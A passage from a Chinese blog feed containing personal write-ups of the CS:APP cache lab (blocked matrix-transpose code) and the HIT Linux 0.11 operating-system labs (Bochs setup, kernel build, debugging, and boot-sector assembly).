class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k, a, b, c, d, e, f, g, h;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 48 * 48</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i+<span class="number">16</span> &lt; N; i += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j+<span class="number">16</span> &lt; M; j+=<span class="number">16</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (k = i; k &lt; i+<span class="number">16</span>; k++) &#123;</span><br><span class="line">                a = A[k][j];</span><br><span class="line">                b = A[k][j+<span class="number">1</span>];</span><br><span class="line">                c = A[k][j+<span class="number">2</span>];</span><br><span class="line">                d = A[k][j+<span class="number">3</span>];</span><br><span class="line">                e = A[k][j+<span class="number">4</span>];</span><br><span class="line">                f = A[k][j+<span class="number">5</span>];</span><br><span class="line">                g = A[k][j+<span class="number">6</span>];</span><br><span class="line">                h = A[k][j+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                B[j+<span class="number">0</span>][k] = a;</span><br><span class="line">                B[j+<span class="number">1</span>][k] = b;</span><br><span class="line">                B[j+<span class="number">2</span>][k] = c;</span><br><span class="line">                B[j+<span class="number">3</span>][k] = d;</span><br><span class="line">                B[j+<span class="number">4</span>][k] = e;</span><br><span class="line">                B[j+<span class="number">5</span>][k] = f;</span><br><span class="line">                B[j+<span class="number">6</span>][k] = g;</span><br><span class="line">                B[j+<span class="number">7</span>][k] = h;</span><br><span class="line"></span><br><span class="line">                a = A[k][j+<span class="number">8</span>];</span><br><span class="line">                b = A[k][j+<span class="number">9</span>];</span><br><span class="line">                c = A[k][j+<span class="number">10</span>];</span><br><span class="line">                d = A[k][j+<span class="number">11</span>];</span><br><span class="line">                e = A[k][j+<span class="number">12</span>];</span><br><span class="line">                f = A[k][j+<span class="number">13</span>];</span><br><span class="line">                g = A[k][j+<span class="number">14</span>];</span><br><span class="line">                h = A[k][j+<span class="number">15</span>];</span><br><span class="line">                B[j+<span class="number">8</span>][k] = a;</span><br><span class="line">                B[j+<span class="number">9</span>][k] = b;</span><br><span class="line">                B[j+<span class="number">10</span>][k] = c;</span><br><span class="line">                B[j+<span class="number">11</span>][k] = d;</span><br><span class="line">                B[j+<span class="number">12</span>][k] = e;</span><br><span class="line">                B[j+<span class="number">13</span>][k] = f;</span><br><span class="line">                B[j+<span class="number">14</span>][k] = g;</span><br><span class="line">                B[j+<span class="number">15</span>][k] = h;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理不规则的部分</span></span><br><span class="line">    <span class="keyword">for</span> (k = i; k &lt; N; k++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (h = <span class="number">0</span>; h &lt; M; h++)&#123;</span><br><span class="line">            B[h][k] = A[k][h];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; i; k++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (h = j; h &lt; M; h++) &#123;</span><br><span class="line">            B[h][k] = A[k][h];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>miss: 1963</p><p>“对角线”的元素（横坐标等于纵坐标）肯定还是会冲突的（其实这个时候不是对角线了，因为不是正方形）。（参考<a href="https://www.cnblogs.com/liqiuhao/p/8026100.html">CS:APP3e 深入理解计算机系统_3e CacheLab实验</a>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; M; j += <span class="number">16</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = i; k &lt; i + <span class="number">16</span> &amp;&amp; k &lt; N; ++k)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> temp_position = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">int</span> temp_value = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> l;</span><br><span class="line">            <span class="keyword">for</span> (l = j; l &lt; j + <span class="number">16</span> &amp;&amp; l &lt; M; ++l)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (l == k) <span class="comment">/* 横坐标等于纵坐标，局部变量暂存，整个block读完再处理 */</span></span><br><span class="line">                &#123;</span><br><span class="line">                    temp_position = k;</span><br><span class="line">                    temp_value = A[k][k];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    B[l][k] = A[k][l];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (temp_position != <span class="number">-1</span>) <span class="comment">/* 遇到了冲突元素 */</span> </span><br><span class="line">            &#123;</span><br><span class="line">                B[temp_position][temp_position] = temp_value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>miss: 1985</p><h1 id="Lab-7"><a href="#Lab-7" class="headerlink" title="Lab 7"></a>Lab 7</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;CSAPP经典实验个人解答，共八个。&lt;/p&gt;</summary>
    
    
    
    <category term="系统" scheme="https://www.fvolcano.red/categories/%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="实验" scheme="https://www.fvolcano.red/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>Linux-0.11操作系统实验</title>
    <link href="https://www.fvolcano.red/2021/linux0.11-hitlabs/"/>
    <id>https://www.fvolcano.red/2021/linux0.11-hitlabs/</id>
    <published>2021-04-06T01:04:38.000Z</published>
    <updated>2021-04-06T01:04:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>哈工大操作系统课程实验记录。<a id="more"></a></p><p>主要内容为</p><table><thead><tr><th align="center">编号</th><th align="center">实验项目</th><th align="center">实验内容</th><th align="center">实验目的</th></tr></thead><tbody><tr><td align="center">实验一</td><td align="center">系统引导</td><td align="center">编写bootsect.s和setup.s，实现一个简单的系统引导。</td><td align="center">深入认识系统引导过程，掌握操作系统开发基本过程。</td></tr><tr><td align="center">实验二</td><td align="center">系统调用</td><td align="center">添加一个系统调用whoami。</td><td align="center">深入认识操作系统接口的工作原理。</td></tr><tr><td align="center">实验三</td><td align="center">进程运行轨迹的跟踪</td><td align="center">编写程序跟踪进程的运行轨迹，主要是进程的状态切换过程。同时替换现有的Linux 0.11进程调度算法，并和现有的进程调度进行对比。</td><td align="center">深入认识进程，能通过实际试验来评价操作系统性能。</td></tr><tr><td align="center">实验四</td><td align="center">信号量实现和应用</td><td align="center">在Linux 0.11上实现信号量，并实践Multiprogramming。</td><td align="center">体会并发进程，掌握进程同步(互斥)技术的实现</td></tr><tr><td align="center">实验五</td><td align="center">Linux 0.11地址映射跟踪与共享</td><td align="center">打印Linux 0.11的地址映射过程到log文件中。</td><td align="center">实践逻辑地址、线性地址、物理地址、段页表等概念。</td></tr><tr><td align="center">实验六</td><td align="center">控制终端显示</td><td align="center">特殊按键修改系统状态，并控制显示(如按F1后总显示**)。</td><td align="center">深入认识设备管理，掌握终端设备驱动的实现。</td></tr><tr><td align="center">实验七</td><td align="center">proc文件系统的实现</td><td align="center">在Linux 0.11上实现一个proc文件系统，动态察看内核。</td><td align="center">体会虚拟文件系统概念，掌握文件系统的实现过程。</td></tr><tr><td align="center">实验八</td><td align="center">在Linux 0.11上实现交换分区和全局页面置换</td><td align="center">在Linux 0.11上完整的虚拟内存，主要是实现全局的页面置换和交换分区设备的管理，并将这两个模块放入系统。</td><td align="center">相比前面的实验而言，本实验较难。将全面加深进程、虚存、磁盘、中断的认识，对OS的系统性获得直接经验。</td></tr></tbody></table><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>课程提供线上环境 <a href="https://www.lanqiao.cn/courses/115">蓝桥-操作系统原理与实践</a>。因为操作过程中出现了一些问题，我改用虚拟机。</p><ul><li>Ubuntu 18.04</li><li>Bochs</li><li>gcc-3.4 (参考资料第一个github中可下载)</li><li>vim</li><li>hit-oslab-linux.tar.gz (参考资料第一个github中可下载)</li></ul><p>实验的基本流程是根据实验要求编写应用程序、修改 Linux 0.11 的源代码，用 gcc 编译后，在 Bochs 的虚拟环境中运行、调试目标代码。</p><blockquote><p>Bochs 是一个免费且开放源代码的 IA-32（x86）架构 PC 机模拟器。在它模拟出的环境中可以运行 Linux、DOS 和各种版本的 Windows 等多种操作系统。且Bochs 本身具有很高的移植性，可以运行在多种软硬件平台之上。</p></blockquote><p>hit-oslab-linux.tar.gz 解压后有：</p><p><img src="/2021/linux0.11-hitlabs/1.png" alt="hit-oslab-linux.tar.gz解压后内容"></p><ul><li>bochs 目录</li></ul><p>bochs 目录下是与 bochs 相关的执行文件、数据文件和配置文件。</p><ul><li>run 脚本</li></ul><p>run 是运行 bochs 的脚本命令。</p><p>运行后 bochs 会自动在它的虚拟软驱 A 和虚拟硬盘上各挂载一个镜像文件，软驱上挂载是 linux-0.11/Image，硬盘上挂载的是 hdc-0.11.img。</p><p>因为 bochs 配置文件中的设置是从软驱 A 启动，所以 Linux 0.11 会被自动加载。而 Linux 0.11 会驱动硬盘，并 mount 硬盘上的文件系统，也就是将 hdc-0.11.img 内镜像的文件系统挂载到 0.11 系统内的根目录 —— <code>/</code>。在 0.11 下访问文件系统，访问的就是 hdc-0.11.img 文件内虚拟的文件系统。</p><ul><li>hdc-0.11.img 文件</li></ul><p>hdc-0.11.img 文件的格式是 Minix 文件系统的镜像。</p><p>Linux 所有版本都支持这种格式的文件系统，所以可以直接在宿主 Linux 上通过 mount 命令访问此文件内的文件，达到宿主系统和 bochs 内运行的 Linux 0.11 之间交换文件的效果。</p><p>Windows 下目前没有（或者是还没发现）直接访问 Minix 文件系统的办法，所以要借助于 fdb.img，这是一个 1.44M 软盘的镜像文件，内部是 FAT12 文件系统。将它挂载到 bochs 的软驱 B，就可以在 0.11 中访问它。而通过 filedisk 或者 WinImage，可以在 Windows 下访问它内部的文件。</p><p>hdc-0.11.img 内包含有：</p><ul><li>Bash shell；</li><li>一些基本的 Linux 命令、工具，比如 cp、rm、mv、tar；</li><li>vi 编辑器；</li><li>gcc 1.4 编译器，可用来编译标准 C 程序；</li><li>as86 和 ld86；</li><li>Linux 0.11 的源代码，可在 0.11 下编译，然后覆盖现有的二进制内核。</li></ul><p>除此之外，还需要安装 gcc-3.4。因为Linux-0.11不能在gcc 4.x版本编译，所以要装老一点儿的编译器。</p><p>在Ubuntu 9.04(jaunty)及之前，用下面命令安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install gcc-3.4</span></span><br></pre></td></tr></table></figure><p>在Ubuntu 9.10(karmic)及之后:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tar -zxvf gcc-3.4-ubuntu.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> gcc-3.4</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ./inst.sh XXX  <span class="comment"># i386 or amd64</span></span></span><br></pre></td></tr></table></figure><blockquote><p>解压gcc-3.4时出现错误：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gzip: stdin: unexpected end of file</span><br><span class="line">tar: Unexpected EOF <span class="keyword">in</span> archive</span><br><span class="line">tar: Unexpected EOF <span class="keyword">in</span> archive</span><br><span class="line">tar: Error is not recoverable: exiting now</span><br></pre></td></tr></table></figure><p>解决方案：</p><ol><li>下载失败，丢失内容：重新下载解压。<br>the error you’re getting is usually due to an incomplete download. The archive ends before the expected footer of the gzipped file. It will probably work fine if you just download it again.</li><li>在windows下解压好后再拖进Ubuntu。</li><li>tar.gz 文件名是否含有非法字符。</li></ol></blockquote><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><p>课程资料 <a href="https://www.bilibili.com/video/av51437944">操作系统-哈工大李治军老师</a></p></li><li><p><a href="https://github.com/hoverwinter/HIT-OSLab">github实验代码</a></p></li><li><p><a href="https://hoverwinter.gitbooks.io/hit-oslab-manual/content/">哈工大操作系统实验手册</a> (FAQ)</p></li><li><p><a href="https://blog.csdn.net/weixin_43166958/article/details/104223425">徐步小兵的实验总结</a></p></li><li><p>linux-0.11 内核完全注释 v3.0 / linux-0.12 by 赵炯</p></li></ul><p>注：实验中用标记为</p><blockquote></blockquote><p>为过程中出现的问题。</p><h1 id="熟悉实验环境"><a href="#熟悉实验环境" class="headerlink" title="熟悉实验环境"></a>熟悉实验环境</h1><h2 id="1-编译内核"><a href="#1-编译内核" class="headerlink" title="1. 编译内核"></a>1. 编译内核</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> ./oslab/linux-0.11/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make all</span></span><br></pre></td></tr></table></figure><p>只要最后没有出现error就说明编译成功。</p><p>linux-0.11目录下是全部的源代码，实验内容靠修改这些代码来完成。修改后需要重新编译内核，还是执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> make all</span></span><br></pre></td></tr></table></figure><p>如果重新编译后，你的修改貌似没有生效，可以试试先“make clean”，再“make all”。“make clean”是删除上一次编译生成的所有中间文件和目标文件，确保是在全新的状态下编译整个工程。</p><h2 id="2-运行与调试"><a href="#2-运行与调试" class="headerlink" title="2. 运行与调试"></a>2. 运行与调试</h2><p>在Bochs中运行最新编译好的内核很简单，在oslab目录下执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./run</span></span><br></pre></td></tr></table></figure><p>如果出现Bochs的窗口，里面显示linux的引导过程，最后停止在<code>[/usr/root/]#</code>，表示运行成功。</p><p><img src="/2021/linux0.11-hitlabs/2.png" alt="Bochs"></p><blockquote><p>执行时出现错误：</p><p>./bochs/bochs-gdb: error while loading shared libraries: libSM.so.6: cannot open shared object file: No such file or directory</p><p>解决方案：<a href="https://blog.csdn.net/qq_40758751/article/details/88707214">https://blog.csdn.net/qq_40758751/article/details/88707214</a></p></blockquote><p>内核调试分为两种模式：汇编级调试和 C 语言级调试。</p><h4 id="（1）汇编级调试"><a href="#（1）汇编级调试" class="headerlink" title="（1）汇编级调试"></a>（1）汇编级调试</h4><p>汇编级调试需要执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 确认在 oslab 目录下</span></span><br><span class="line">$ <span class="built_in">cd</span> ~/oslab/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行脚本前确定已经关闭刚刚运行的 Bochs</span></span><br><span class="line">$ ./dbg-asm</span><br></pre></td></tr></table></figure><blockquote><p>汇编级调试的启动之后 Bochs 是黑屏，这是正常的。</p></blockquote><p>可以用命令 <code>help</code> 来查看调试系统用的基本命令。更详细的信息请查阅 Bochs 使用手册。</p><p><img src="https://doc.shiyanlou.com/courses/uid977658-20190618-1560852351872" alt="图片描述"></p><h4 id="（2）C-语言级调试"><a href="#（2）C-语言级调试" class="headerlink" title="（2）C 语言级调试"></a>（2）C 语言级调试</h4><p>C 语言级调试稍微复杂一些。首先执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/oslab</span><br><span class="line">$ ./dbg-c</span><br></pre></td></tr></table></figure><p><strong>然后再打开一个终端窗口</strong>，执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/oslab</span><br><span class="line">$ ./rungdb</span><br></pre></td></tr></table></figure><blockquote><p>注意：启动的顺序不能交换，否则 gdb 无法连接。</p></blockquote><p>出现下图所示的提示，才说明连接成功：</p><p><img src="https://doc.shiyanlou.com/courses/uid977658-20190618-1560853330438" alt="图片描述"></p><p>新终端窗口中运行的是 GDB 调试器。关于 gdb 调试器请查阅 GDB 使用手册。</p><h2 id="3-文件交换"><a href="#3-文件交换" class="headerlink" title="3. 文件交换"></a>3. 文件交换</h2><blockquote><p>开始设置文件交换之前，务必关闭所有的 Bochs 进程。</p></blockquote><p>oslab 下的 <code>hdc-0.11-new.img</code> 是 0.11 内核启动后的根文件系统镜像文件，相当于在 bochs 虚拟机里装载的硬盘。在 Ubuntu 上访问其内容的方法是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/oslab/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动挂载脚本</span></span><br><span class="line">$ sudo ./mount-hdc</span><br></pre></td></tr></table></figure><p>之后，hdc 目录下就是和 0.11 内核一模一样的文件系统了，可以读写任何文件（可能有些文件要用 sudo 才能访问）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入挂载到 Ubuntu 上的目录</span></span><br><span class="line">$ <span class="built_in">cd</span> ~/oslab/hdc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看内容</span></span><br><span class="line">$ ls -al</span><br></pre></td></tr></table></figure><p>读写完毕，不要忘了卸载这个文件系统：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/oslab/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载</span></span><br><span class="line">$ sudo umount hdc</span><br></pre></td></tr></table></figure><p>经过 <code>sudo ./mount-hdc</code> 这样处理以后，我们可以在 Ubuntu 的 hdc 目录下创建一个 xxx.c 文件，然后利用 Ubuntu 上的编辑工具（如 gedit 等）实现对 xxx.c 文件的编辑工作，在编辑保存以后。</p><p>执行 <code>sudo umount hdc</code> 后，再进入 Linux 0.11（即 run 启动 bochs 以后）就会看到这个 xxx.c（即如下图所示），这样就避免了在 Linux 0.11 上进行编辑 xxx.c 的麻烦，因为 Linux 0.11 作为一个很小的操作系统，其上的编辑工具只有 vi，使用起来非常不便。</p><p><img src="https://doc.shiyanlou.com/userid19614labid568time1423993300541" alt="用 Ubuntu 和 Linux 0.11 完成文件交换以后再启动 Linux 0.11 以后"></p><p>另外在 Linux 0.11 上产生的文件，如后面实验中产生的 <code>process.log</code> 文件，可以按这种方式 “放到” Ubuntu 下用 python 程序进行处理，当然这个 python 程序在 Linux 0.11 上显然是不好使的，因为 Linux 0.11 上搭建不了 python 解释环境。</p><blockquote><p>注意 1：不要在 0.11 内核运行的时候 mount 镜像文件，否则可能会损坏文件系统。同理，也不要在已经 mount 的时候运行 0.11 内核。</p><p>注意 2：在关闭 Bochs 之前，需要先在 0.11 的命令行运行 “sync”，确保所有缓存数据都存盘后，再关闭 Bochs。</p></blockquote><h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><p>Q: 为何有时Bochs的光标闪动，却不响应我的输入？</p><p>A: 按一下Alt，然后再试试。 如果你习惯用Alt+Tab切换窗口，就肯定会遇到这个问题。原因是在Bochs窗口按下Alt，Bochs会接收到Alt按下的事件，然后将此事件传给Linux 0.11。待再按下Tab时，主机操作系统经判断认定这是一个切换窗口的快捷键，于是直接切换窗口，Tab和Alt抬起的事件都不会再发给Bochs。等切换会Bochs，Linux 0.11此时还处于认为Alt已按下的状态，再按任何按键都被解释成是和Alt组合的按键，所以就“好像”不响应了（按数字键可以看到它的响应）。</p><p>Q: 怎样加快make clean、make all的速度？</p><p>A: 如果只修改了kernel目录下的文件，删除kernel目录下的kernel.o，然后直接make就行了。其它目录方法类似。</p><p>Q: Bochs屏幕乱了怎么办？</p><p>A: 这是Linux的终端控制和Bochs虚拟的终端之间配合不好导致的，一般在大量输出信息后，会出现混乱，甚至很像死机。此时按ctrl+l可以缓解一下。最好是用输出重定向功能将输出都重定向到一个文件，然后用vi看。</p><h1 id="实验一、操作系统引导"><a href="#实验一、操作系统引导" class="headerlink" title="实验一、操作系统引导"></a>实验一、操作系统引导</h1><h2 id="基本内容"><a href="#基本内容" class="headerlink" title="基本内容"></a>基本内容</h2><ol><li>阅读《Linux内核完全注释》的第6章，对计算机和Linux 0.11的引导过程进行初步的了解；</li><li>按照要求改写0.11的引导程序bootsect.s<ol><li>bootsect.s 能在屏幕上打印一段提示信息“XXX is booting…”，其中 XXX 是你给自己的操作系统起的名字，例如 LZJos、Sunix 等（可以上论坛上秀秀谁的 OS 名字最帅，也可以显示一个特色 logo，以表示自己操作系统的与众不同。）</li></ol></li><li>改写进入保护模式前的设置程序setup.s。<ol><li>bootsect.s 能完成 setup.s 的载入，并跳转到 setup.s 开始地址执行。而 setup.s 向屏幕输出一行”Now we are in SETUP”。</li><li>setup.s 能获取至少一个基本的硬件参数（如内存参数、显卡参数、硬盘参数等），将其存放在内存的特定地址，并输出到屏幕上。</li><li>setup.s 不再加载 Linux 内核，保持上述信息显示在屏幕上即可。</li></ol></li><li>配套李老师课程：L2 L3</li></ol><p>开始实验前，需要了解：</p><p>（1）相关代码文件</p><p>Linux 0.11 文件夹中的 <code>boot/bootsect.s</code>、<code>boot/setup.s</code> 和 <code>tools/build.c</code> 是本实验会涉及到的源文件。它们的功能详见《注释》的 6.2、6.3 节和 16 章。</p><p>（2）引导程序的运行环境</p><p>引导程序由 BIOS 加载并运行。它活动时，操作系统还不存在，整台计算机的所有资源都由它掌控，而能利用的功能只有 BIOS 中断调用。</p><p>实验中主要使用 BIOS 0x10 和 0x13 中断。</p><h2 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h2><p>有时，继承传统意味着别手蹩脚。x86 计算机为了向下兼容，导致启动过程比较复杂。请找出 x86 计算机启动过程中，被硬件强制，软件必须遵守的两个“多此一举”的步骤（多找几个也无妨），说说它们为什么多此一举，并设计更简洁的替代方案。</p><p>参考材料：<a href="https://www.wikiwand.com/zh/X86">wiki: x86</a></p><p>x86最先由实模式慢慢发展到保护模式，这中间有过很多为了向下兼容而不得不妥协的作法，比如说为了能访问更多的内存而开启了A20，为了在保护模式下可以运行实模式的程序而设计了v86(虚拟实模式) <a href="https://www.wikiwand.com/zh/%E8%99%9A%E6%8B%9F8086%E6%A8%A1%E5%BC%8F">wiki: 虚拟8086模式</a>等。</p><p>1） 计算机上电，BIOS初始化中断向量表后，会将启动设备的第一个扇区（即引导扇区）读入内存地址0x7c00（31KB)处，并跳转到此处开始执行。而为了方便加载主模块，引导程序首先会将自己移动到内存相对靠后的位置，如linux0.11的bootsect程序先将自己移动到0x90000(576KB)处。这样先移动是多此一举的。</p><ul><li>解决方案：在保证可靠性的前提下尽量扩大实地址模式下BIOS可访问的内存的范围，如引导扇区加载到0x90000等内存高地址处而不是0x7c00。</li></ul><p>2） 计算机上电后，ROM BIOS会在物理内存0处初始化中断向量表，其中有256个中断向量，每个中断向量占用4字节，共1KB，在物理内存地址0x000 - ox3ff处，这些中断向量供BIOS中断使用。这就导致了一个问题，如果操作系统的引导程序在加载操作系统时使用了BIOS中断来获取或者显示一些信息时，这1KB地址不能被覆盖。然而操作系统的主模块为了让其中代码地址等于实际的物理地址，需要将其加载到内存0x0000处。所以操作系统在加载时需要先将主模块加载到内存中不与BIOS中断向量表冲突的地方，之后可以覆盖中断向量表时才将其移动到内存起始处，如Linux0.11的System模块就是在bootsect程序中先加载到0x10000,之后在setup程序中移到0x0000处。 这样先加载到另外地方之后再移动到内存起始位置是多此一举的。</p><ul><li>解决方案：可以将BIOS中断向量表放到实模式下能寻址内存的其他地方，操作系统引导程序直接将操作系统的主模块读到内存的起始处。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200208110055585.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200208110730725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE2Njk1OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="bootsect-s-屏幕输出"><a href="#bootsect-s-屏幕输出" class="headerlink" title="bootsect.s 屏幕输出"></a>bootsect.s 屏幕输出</h2><blockquote><p>代码中以 <code>!</code> 开头的行都是注释，实际在写代码时可以忽略。</p></blockquote><p>首先来看完成屏幕显示的关键代码，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">! 首先读入光标位置</span><br><span class="line">    mov ah,#0x03</span><br><span class="line">    xor bh,bh</span><br><span class="line">    int 0x10</span><br><span class="line"></span><br><span class="line">! 显示字符串 “Hello OS world, my name is LZJ”</span><br><span class="line">! 要显示的字符串长度</span><br><span class="line">    mov cx,#36</span><br><span class="line">    mov bx,#0x0007</span><br><span class="line">    mov bp,#msg1</span><br><span class="line">! es:bp 是显示字符串的地址</span><br><span class="line">! 相比与 linux-0.11 中的代码，需要增加对 es 的处理，因为原代码中在输出之前已经处理了 es</span><br><span class="line">    mov ax,#0x07c0</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov ax,#0x1301</span><br><span class="line">    int 0x10</span><br><span class="line"></span><br><span class="line">! 设置一个无限循环</span><br><span class="line">inf_loop:</span><br><span class="line">    jmp inf_loop</span><br></pre></td></tr></table></figure><p>这里需要修改的是字符串长度，即用需要输出的字符串长度替换 <code>mov cx,#24</code> 中的 24。要注意：除了我们设置的字符串 msg1 之外，还有三个换行 + 回车，一共是 6 个字符。比如这里 <code>Hello OS world, my name is LZJ</code> 的长度是 30，加上 6 后是 36，所以代码应该修改为 <code>mov cx,#36</code>。</p><p>接下来就是修改输出的字符串了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">! msg1 处放置字符串</span><br><span 